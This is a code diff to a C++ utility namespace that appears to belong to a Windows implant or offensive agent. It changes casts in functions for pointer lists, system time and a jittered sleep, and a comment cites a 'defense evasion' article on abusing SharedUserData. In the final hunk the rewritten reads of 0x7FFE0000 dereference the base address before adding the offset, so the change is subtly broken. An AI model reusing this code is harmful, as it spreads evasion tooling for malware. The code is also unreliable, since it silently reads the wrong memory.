@@ -15,7 +15,7 @@ namespace Utils {
 
     VOID AppendPointerList(void **array[], void *pointer, uint32_t *count) {
 
-        const auto new_list = R_CAST(void**, x_realloc(*array, (*count + 1) * sizeof(void*)));
+        const auto new_list = (void**) x_realloc(*array, (*count + 1) * sizeof(void*));
         if (!new_list) {
             return;
         }
@@ -58,8 +58,8 @@ namespace Utils {
 
             Ctx->win32.GetSystemTimeAsFileTime(&FileTime);
 
-            LargeInt.LowPart = FileTime.dwLowDateTime;
-            LargeInt.HighPart = S_CAST(long, FileTime.dwHighDateTime);
+            LargeInt.LowPart    = FileTime.dwLowDateTime;
+            LargeInt.HighPart   = (long) FileTime.dwHighDateTime;
 
             return LargeInt.QuadPart;
         }
@@ -100,7 +100,7 @@ namespace Utils {
             // https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html
 
             auto defaultseed    = Utils::Random::RandomSeed();
-            auto seed           = Ctx->nt.RtlRandomEx(S_CAST(PULONG, &defaultseed));
+            auto seed           = Ctx->nt.RtlRandomEx((ULONG*) &defaultseed);
 
             volatile size_t x   = INTERVAL(seed);
             const uintptr_t end = Utils::Random::Timestamp() + (x * ms);
@@ -182,8 +182,8 @@ namespace Utils {
             const size_t epoch      = 0x019DB1DED53E8000;
             const size_t ms_ticks   = 1000;
 
-            time.u.LowPart  = *R_CAST(uint32_t*, 0x7FFE0000 + 0x14);
-            time.u.HighPart = *R_CAST(int32_t*, 0x7FFE0000 + 0x1c);
+            time.u.LowPart  = *(uint32_t*) 0x7FFE0000 + 0x14;
+            time.u.HighPart = *(int32_t*) 0x7FFE0000 + 0x1c;
 
             return (time.QuadPart - epoch) / ms_ticks;
         }
